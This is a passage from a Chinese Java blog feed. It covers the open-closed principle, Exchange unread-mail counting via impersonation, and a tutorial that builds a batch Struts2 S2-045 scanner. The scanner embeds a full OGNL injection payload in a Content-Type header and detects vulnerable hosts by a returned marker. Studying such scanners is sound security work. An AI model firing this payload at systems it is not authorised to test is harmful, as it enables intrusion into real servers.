phone<span class="token punctuation">.</span><span class="token function">clickButton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>调用:</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * Created by wanghe on 2019/4/27. */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Person xiaoming <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        XiaomiPhone phone <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XiaomiPhone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        xiaoming<span class="token punctuation">.</span><span class="token function">openPhone</span><span class="token punctuation">(</span>phone<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这样虽然clickButton()逻辑又增加了，但是使用者只关心clickButton()这个方法,不用关心内部逻辑是什么变化的，这就是“封装变化”</p><p>抽象约束（把应该要约束的条件抽象化,对未来可能要变化的属性，方法等抽象化）：<br>假设：我们增加一台vivo手机，那么我们就需要更改Person.openPhone(XiaomiPhone phone)方法，这就不符合开闭原则了，因为一旦方法完成，我们就应该尽量不要去改动它，这才是开闭原则的一个核心概念</p><p>所以我们可以这么改: </p><blockquote><p>把Phone抽象化,让每个手机都去继承这个抽象的Phone，这样我们就把可能方法变化的属性抽象化了</p></blockquote><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * Created by wanghe on 2019/4/27. */</span><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractPhone</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">clickButton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * 小米手机 * Created by wanghe on 2019/4/27. */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">XiaomiPhone</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractPhone</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 点亮屏幕</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">lightScreen</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"点亮屏幕了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 加载操作系统</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">loadSystem</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"操作系统加载完成了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 搜索信号</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">searchSignal</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"信号搜索完成了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 加载字体库</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">loadCharactor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"字体库加载完成了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 开机</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">clickButton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">loadSystem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">loadCharactor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">lightScreen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">searchSignal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** *  Vivo手机 * Created by wanghe on 2019/4/27. */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">VivoPhone</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractPhone</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 点亮屏幕</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">lightScreen</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"点亮屏幕了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 加载操作系统</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">loadSystem</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"操作系统加载完成了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 搜索信号</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">searchSignal</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"信号搜索完成了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 加载字体库</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">loadCharactor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"字体库加载完成了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 开机</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">clickButton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">loadSystem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">loadCharactor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">lightScreen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">searchSignal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * 人 * Created by wanghe on 2019/4/27. */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">openPhone</span><span class="token punctuation">(</span>AbstractPhone phone<span class="token punctuation">)</span> <span class="token punctuation">{</span>        phone<span class="token punctuation">.</span><span class="token function">clickButton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>最后我们符合了开闭原则,对扩展开放，因为clickButton()的逻辑可以随便改,openPhone(AbstractPhone phone)对抽象约束</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Person xiaoming <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        XiaomiPhone phone <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XiaomiPhone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        VivoPhone vivoPhone <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VivoPhone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        xiaoming<span class="token punctuation">.</span><span class="token function">openPhone</span><span class="token punctuation">(</span>phone<span class="token punctuation">)</span><span class="token punctuation">;</span>        xiaoming<span class="token punctuation">.</span><span class="token function">openPhone</span><span class="token punctuation">(</span>vivoPhone<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
          <category> 六大设计原则 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
            <tag> 六大设计原则 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java读取Exchange Server未读邮件数量</title>
      <link href="/2020/05/24/java-du-qu-exchangeserver-wei-du-you-jian-shu-liang/"/>
      <url>/2020/05/24/java-du-qu-exchangeserver-wei-du-you-jian-shu-liang/</url>
      
        <content type="html"><![CDATA[<h2 id="1、准备工作"><a href="#1、准备工作" class="headerlink" title="1、准备工作"></a>1、准备工作</h2><p>#####一、打开exchange shell，使用如下命令提升administrator账号为exchange超级管理，让它具有对其他用户操作的权限</p><pre><code>New-ManagementRoleAssignment -Name:impersonationAssignmentName -Role:ApplicationImpersonation -User:administrator</code></pre><p>注:如果以上命令执行失败，请尝试先执行下面这条命令，在执行上面的</p><pre><code>Remove-ManagementRoleAssignment &quot;impersonationAssignmentName&quot;</code></pre><br />#####二、exchange server 可以进行web访问<pre><code>https://xxxx.com/EWS/Exchange.asmx</code></pre><pre><code>https://xxxx.com/owa</code></pre><p>#####三、添加邮箱账户<br>添加多个邮箱账户，同时给发这几个用户分别发送不同数量的邮件，记得不要查看，因为要读取未读邮件</p><br />2、关键代码---<pre><code>package com.codesql.utils;import java.net.URI;import microsoft.exchange.webservices.data.ConnectingIdType;import microsoft.exchange.webservices.data.ExchangeCredentials;import microsoft.exchange.webservices.data.ExchangeService;import microsoft.exchange.webservices.data.ExchangeVersion;import microsoft.exchange.webservices.data.Folder;import microsoft.exchange.webservices.data.ImpersonatedUserId;import microsoft.exchange.webservices.data.WebCredentials;import microsoft.exchange.webservices.data.WellKnownFolderName;public class ReaderExchanageUnreadMail {    // aduser=administrator    // adpass=密码    // addomain=域的名字    // suffix=@xxx.com    // uri=https://mail.xxx.com/EWS/Exchange.asmx    // sid 被查询用户的名称        public String getCount(String aduser, String adpass, String addomain, String uri, String suffix, String sid) throws Exception {        String count = &quot;0&quot;;        ExchangeService service = new ExchangeService(                ExchangeVersion.Exchange2010_SP1);        ExchangeCredentials credentials = new WebCredentials(aduser, adpass,addomain);        //ExchangeCredentials credentials = new WebCredentials(&quot;bbbb&quot;, &quot;Aa123456&quot;,&quot;fr&quot;);        service.setCredentials(credentials);        ImpersonatedUserId other= new ImpersonatedUserId(ConnectingIdType.SmtpAddress, sid+suffix);        service.setImpersonatedUserId(other);        service.setUrl(new URI(uri));        //service.setTraceEnabled(true);        // 服务地址        try {            Folder inbox = Folder.bind(service, WellKnownFolderName.Inbox);            // 收件箱            // System.out.println(&quot;未读邮件数：&quot; + inbox.getUnreadCount());            count = inbox.getUnreadCount() + &quot;&quot;;        } catch (Exception e) {        //    e.printStackTrace();        }        return count;    }}</code></pre><p>当然，为了方便调用，具体代码我已经打包成jar，你可以在文章末尾的链接中下载<br><br /><br>3、Reum.jar的使用</p><hr><pre><code>public class PropertiesParam {    private String aduser;    private String adpass;    private String addomain;    private String uri;    private String suffix;    public PropertiesParam(String aduser, String adpass, String addomain,            String uri, String suffix) {        super();        this.aduser = aduser;        this.adpass = adpass;        this.addomain = addomain;        this.uri = uri;        this.suffix = suffix;    }    // 省略 get/set    // toSting();}</code></pre><p>给ajax调用的方法</p><pre><code>    public void doPost(HttpServletRequest request, HttpServletResponse response)            throws ServletException, IOException {        String identify = &quot;0&quot;; // 未读邮件数量        String sid = request.getParameter(&quot;sid&quot;); // sid 邮箱用户名称        ReaderExchanageUnreadMail  reum = new ReaderExchanageUnreadMail();        try {            identify = reum.getCount(initparam.getAduser(), initparam.getAdpass(),initparam.getAddomain()                    , initparam.getUri(), initparam.getSuffix() , sid);            System.out.println(&quot;count  &quot; + identify);        } catch (Exception e) {            e.printStackTrace();        }        try {            request.setCharacterEncoding(&quot;utf-8&quot;);            response.setContentType(&quot;text/html;charset=utf-8&quot;);            PrintWriter out = response.getWriter();            out.print(identify);            out.flush();            out.close();        } catch (IOException e) {            e.printStackTrace();        }    }</code></pre><p>jar下载地址：链接: <a href="https://pan.baidu.com/s/1SOioBPlEDyTl1qqCHjMDmg" target="_blank" rel="noopener">https://pan.baidu.com/s/1SOioBPlEDyTl1qqCHjMDmg</a> 密码: 3qh1<br>备用下载地址：<a href="https://download.csdn.net/download/immortalitywang/10401841" target="_blank" rel="noopener">https://download.csdn.net/download/immortalitywang/10401841</a><br><br /><br>参考链接：<a href="https://blog.csdn.net/feihu19851111/article/details/17135825" target="_blank" rel="noopener">https://blog.csdn.net/feihu19851111/article/details/17135825</a></p>]]></content>
      
      
      <categories>
          
          <category> Exchange Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Exchange Server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java编写web漏洞扫描系列二</title>
      <link href="/2020/05/24/java-bian-xie-web-lou-dong-sao-miao-xi-lie-er/"/>
      <url>/2020/05/24/java-bian-xie-web-lou-dong-sao-miao-xi-lie-er/</url>
      
        <content type="html"><![CDATA[<h1 id="java编写web漏洞扫描系列-二、-案例-Struts2漏洞扫描器"><a href="#java编写web漏洞扫描系列-二、-案例-Struts2漏洞扫描器" class="headerlink" title="java编写web漏洞扫描系列 二、(案例)Struts2漏洞扫描器"></a>java编写web漏洞扫描系列 二、(案例)Struts2漏洞扫描器</h1><p>本文是编写web漏洞扫描器的第二章，将使用一个小案例带领大家入门一下！</p><hr><p> 开始，上一节我们说了Java发送GET/POST请求，一级简单的实现了一个检测Struts2漏洞的小工具，在本节中，我们将对它进行扩展，增加线程，提高扫描的效率并支持批量扫描！</p><p>那么想要以上一共我们可能会需要几个方法：<br>&emsp;<strong>1.检测漏洞的方法</strong><br>&emsp;<strong>2.从文本读取文件的方法</strong><br>&emsp;<strong>3.一个线程池进行管理</strong></p><p>以上三个方法就是我们必须要有的方法，缺的只是在一个主类里面进行调用这些方法。好的，先把需要用到的方法写出来!</p><h4 id="第一步准备方法"><a href="#第一步准备方法" class="headerlink" title="第一步准备方法"></a>第一步准备方法</h4><p>1.文件读取和漏洞检测工具类:</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>BufferedReader<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>File<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileReader<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ArrayList<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * 工具类 * */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Utils</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 读取文件     *      * @param filePath 文件路径     * @return 返回待检测目标集合     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> List<span class="token operator">&lt;</span>String<span class="token operator">></span> <span class="token function">readFile</span><span class="token punctuation">(</span>String filePath<span class="token punctuation">)</span> <span class="token punctuation">{</span>        List<span class="token operator">&lt;</span>String<span class="token operator">></span> target <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 待检测目标</span>        File file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 读取文件File</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>file<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> file<span class="token punctuation">.</span><span class="token function">isDirectory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"请检查文件是否存在或路径为文件!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            FileReader fileReader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>            BufferedReader reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span>fileReader<span class="token punctuation">)</span><span class="token punctuation">;</span>            String line <span class="token operator">=</span> null<span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                target<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"读取文件异常!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// e.printStackTrace();</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> target<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 漏洞检测方法     *      * @param target 目标     *      */</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">str045</span><span class="token punctuation">(</span>String target<span class="token punctuation">)</span> <span class="token punctuation">{</span>        String payload <span class="token operator">=</span> <span class="token string">"%{(#nikenb='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))."</span>                <span class="token operator">+</span> <span class="token string">"(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('exist045')).(#o.close())}"</span><span class="token punctuation">;</span>        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> headers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        headers<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"User-Agent"</span><span class="token punctuation">,</span>                <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        headers<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">;</span>        String postResponseBody <span class="token operator">=</span> Req<span class="token punctuation">.</span><span class="token function">sendPost</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> headers<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 请求的方法还是上节课的方法</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>postResponseBody<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"exist045"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"[*] exist st2-045: "</span> <span class="token operator">+</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>接下来我们只差一个够把上面这些方法组合起来的主类了!</p><h4 id="第二步主类完善"><a href="#第二步主类完善" class="headerlink" title="第二步主类完善"></a>第二步主类完善</h4><pre><code>import java.util.List;public class Main {    public static void main(String[] args) {        String filePath = &quot;&quot;; // 文件路径        List&lt;String&gt;  target = Utils.readFile(filePath); // 待扫描目标        for (String t : target) {            Utils.str045(t); // 检测漏洞        }    }}</code></pre><p>当然我们这样只能在开发工具中的使用，我们可能希望打包成jar，随时使用！<br>那么我们先改造一下程序主类，让它能够接收到参数!</p><pre><code>import java.util.List;public class Main {    public static void main(String[] args) {        if (args.length == 0) {            System.out.println(&quot;usage: java -jar struts2Detection.jar --file=target.txt&quot;);            return;        }        String filePath = &quot;&quot;; // 文件路径        for (String string : args) {            int len = string.indexOf(&quot;--file=&quot;);            if (len &gt; -1) {                filePath = string.substring(len + 7, string.length());                System.out.println(&quot;filePath=&quot; + filePath);                break;            }        }        List&lt;String&gt; target = Utils.readFile(filePath); // 待扫描目标        for (String t : target) {            Utils.str045(t); // 检测漏洞        }    }}</code></pre><p>下面说下导出成jar的过程：<br>对项目右键 - Export - Java - JAR file<br>然后选择导出路径<br><img src="https://img-blog.csdn.net/20180807220430913?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ltbW9ydGFsaXR5V2FuZw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>在经过两次Next之后，会来到一处让我们选择程序入口类，也就是存在Main函数的类，选择之后点击Finish即可！</p><p><img src="https://img-blog.csdn.net/20180807220518600?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ltbW9ydGFsaXR5V2FuZw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h3 id="使用过程"><a href="#使用过程" class="headerlink" title="使用过程"></a>使用过程</h3><p><img src="https://img-blog.csdn.net/20180807220627139?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ltbW9ydGFsaXR5V2FuZw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br><img src="https://img-blog.csdn.net/20180807220640314?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ltbW9ydGFsaXR5V2FuZw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>好的到这里这个单线程版本就已经完成，线程版本会在下节里面讲解。</p><p>到这里，大家应该会发现一个问题，就是扫描成功的结果，没有保存！这里留给大家自行完成，可以是保存为txt也好，xml也行！</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 安全工具 </category>
          
          <category> Java安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具编写 </tag>
            
            <tag> web安全 </tag>
            
            <tag> Struts2漏洞扫描器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java编写web漏洞扫描系列一</title>
      <link href="/2020/05/24/java-bian-xie-web-lou-dong-sao-miao-xi-lie-yi/"/>
      <url>/2020/05/24/java-bian-xie-web-lou-dong-sao-miao-xi-lie-yi/</url>
      
        <content type="html"><![CDATA[<p>######今天是java编写漏洞扫描工具系列一，在整个系列中我将以案例驱动方式进行，从基本的请求，到常规漏洞扫描，Burp插件，调用SQLmap api，整合burp+sqlmap(Web平台)，漏洞扫描平台（漏洞平台支持被动主动扫描，插件式集成支持python插件）。</p><p>我的开发环境为: eclipse + jdk 1.8<br>&nbsp;&nbsp;&nbsp;在Web端下，基本上就是GET/POST请求，大部分漏洞的利用也是如此。将我们手工操作的流程-过程用代码是模拟的过程就是编写漏洞扫描工具.<br><img src="https://img-blog.csdn.net/20180802214049351?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ltbW9ydGFsaXR5V2FuZw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>&emsp;漏洞扫描工具可以帮助我们减少重复性的手工操作，并且效率极大的提高。人工操作10分钟，电脑零点几秒就可以完成，在对目标非常多的情况下，扫描工具更是必不可缺。但是工具毕竟是工具，它不可能像人脑一样的分析处理判断事物，所以工具会有误报和漏报的情况下。<br>&emsp;当然还有一些漏洞甚至是工具无法完成的，比如逻辑漏洞，逻辑漏洞名 “逻辑” 意思就是说开发者思维上的漏洞， 从一个开发者没有没有想到的角度去出发，但是可以做到和正常角度出发达到同样的目的，就是思考上的缺陷。这个智能的过程很明显是工具无法完成，但是要知道从你打开一个链接到接收到响应显示到页面上，中间可能会发生n多个请求。更别说频繁浏览网页的情况下，所以我们仍然可以编写一些针对性的扫描工具，来对请求进行筛选，得到我们最想看到的请求信息.<br><img src="https://img-blog.csdn.net/20180802214235972?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ltbW9ydGFsaXR5V2FuZw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>好了，作为系列课程的第一部分，我们先从最基础GET/POST请求说起！<br>先看下，使用java的API发出一个GET AND POST 请求<br>GET 请求 :</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**     * GET请求     *      * @param target 网址     * @return     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">sendGet</span><span class="token punctuation">(</span>String target<span class="token punctuation">)</span> <span class="token punctuation">{</span>        StringBuilder responseBody <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 请求的响应内容</span>        BufferedReader reader<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            URL url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//java.net.URL类，解析URL</span>            URLConnection openConnection <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 打开连接，返回URLConnection实例</span>            <span class="token comment" spellcheck="true">// 获得服务端响应输入流，并将请求内容逐行追加到responseBody</span>            reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token 